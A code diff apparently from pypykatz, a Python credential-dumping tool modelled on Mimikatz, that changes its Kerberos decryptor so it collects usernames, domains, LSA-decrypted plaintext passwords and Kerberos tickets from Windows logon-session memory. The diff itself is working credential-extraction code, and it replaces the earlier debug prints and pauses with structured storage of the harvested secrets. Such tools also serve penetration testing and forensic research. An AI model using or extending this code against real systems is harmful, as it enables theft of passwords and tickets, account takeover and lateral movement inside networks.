@@ -12,6 +12,25 @@ from pypykatz.commons.kerberosticket import *
 from .templates import *
 from pypykatz.lsadecryptor.package_commons import *
 
+class KerberosCredential:
+	def __init__(self):
+		self.username = None
+		self.password = None
+		self.domainname = None
+		self.luid = None
+		self.tickets = []
+		
+	def __str__(self):
+		t = '\t== Kerberos ==\n'
+		t += '\t\tUsername: %s\n' % self.username
+		t += '\t\tDomain: %s\n' % self.domainname
+		t += '\t\tPassword: %s\n' % self.password
+		#for ticket in self.tickets:
+		#	t += '\t\t%s' % str(ticket).replace('\n','\n\t\t\t')[:-3]
+		
+		return t
+		
+
 class KerberosDecryptor(PackageDecryptor):
 	def __init__(self, reader, decryptor_template, lsa_decryptor):
 		super().__init__('Kerberos')
@@ -19,6 +38,8 @@ class KerberosDecryptor(PackageDecryptor):
 		self.decryptor_template = decryptor_template
 		self.lsa_decryptor = lsa_decryptor
 		self.credentials = []
+		
+		self.current_cred = None
 		
 	def find_signature(self):
 		logging.log(1, '[KerberosDecryptor] Searching for key struct signature')
@@ -39,15 +60,11 @@ class KerberosDecryptor(PackageDecryptor):
 	def handle_ticket(self, kerberos_ticket):
 		try:
 			kt = KerberosTicket.parse(kerberos_ticket, self.reader)
-			print(str(kt))
-			input('press button recieve bacon')
-			#self.log_ptr(kerberos_ticket.ServiceName.value, 'Kerberos ticket servicename')
-			#servicename = kerberos_ticket.ServiceName.read(self.reader)
-			#servicename.read(self.reader)
-			#print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!TargetDomainname: %s' % kerberos_ticket.TargetDomainName.read_string(self.reader))
+			self.current_cred.tickets.append(kt)
+			#print(str(kt))
 		except Exception as e:
 			raise e
-		input('ticket')
+		#input('ticket')
 		
 	def handle_session_key(self, session):
 		input('key')
@@ -73,14 +90,14 @@ class KerberosDecryptor(PackageDecryptor):
 				self.reader.move(ptr)
 				kerberos_logon_session = self.decryptor_template.kerberos_session_struct(self.reader)
 				print('LUID: %x' % kerberos_logon_session.LocallyUniqueIdentifier)
+				self.current_cred = KerberosCredential()
+				self.current_cred.luid = kerberos_logon_session.LocallyUniqueIdentifier
 				
-				### session secrets
-				#print(kerberos_logon_session.credentials.UserName.read_string(self.reader))
-				#print(kerberos_logon_session.credentials.Domaine.read_string(self.reader))
-				#print(kerberos_logon_session.credentials.Password.read_data(self.reader).hex())
-				# this could be machine password as well! (meaning: a huge blob of bytes!)
+				self.current_cred.username = kerberos_logon_session.credentials.UserName.read_string(self.reader)
+				self.current_cred.domainname = kerberos_logon_session.credentials.Domaine.read_string(self.reader)
+				
 				password_crear = self.lsa_decryptor.decrypt(kerberos_logon_session.credentials.Password.read_data(self.reader))
-				#print(hexdump(password_crear))
+				self.current_cred.password = password_crear
 				
 				#### key list (still in session) this is not a linked list (thank god!)
 				if kerberos_logon_session.pKeyList.value != 0:
@@ -149,23 +166,7 @@ class KerberosDecryptor(PackageDecryptor):
 				
 				if kerberos_logon_session.Tickets_3.Flink.value != 0 and kerberos_logon_session.Tickets_3.Flink.value != kerberos_logon_session.Tickets_3.Flink.location:
 					self.walk_list(kerberos_logon_session.Tickets_3.Flink,self.handle_ticket , override_ptr = self.decryptor_template.kerberos_ticket_struct)
-				#input('push button')
-			"""
-			self.reader.move(entry_ptr_loc)
-			
-			#test
-			a = self.reader.get_ptr(entry_ptr_loc)
-			self.log_ptr(a, 'TEST', datasize= 0x200)
-			input('a')
-			
-			entry_ptr = self.decryptor_template.logon_session_struct(self.reader)
-			kerberos_entry = entry_ptr.read(self.reader)
-			self.log_ptr(entry_ptr.value, 'List entry -%s-' % self.decryptor_template.logon_session_struct.__name__, datasize= 0x200)
-		
-		
-		
-			self.walk_list(kerberos_entry.Tickets_1.Flink, kerberos_entry.Tickets_1.Flink.location, self.add_entry, override_ptr = self.decryptor_template.internal_ticket_struct)
-			
-			"""
+				
+				self.credentials.append(self.current_cred)
 			
 	
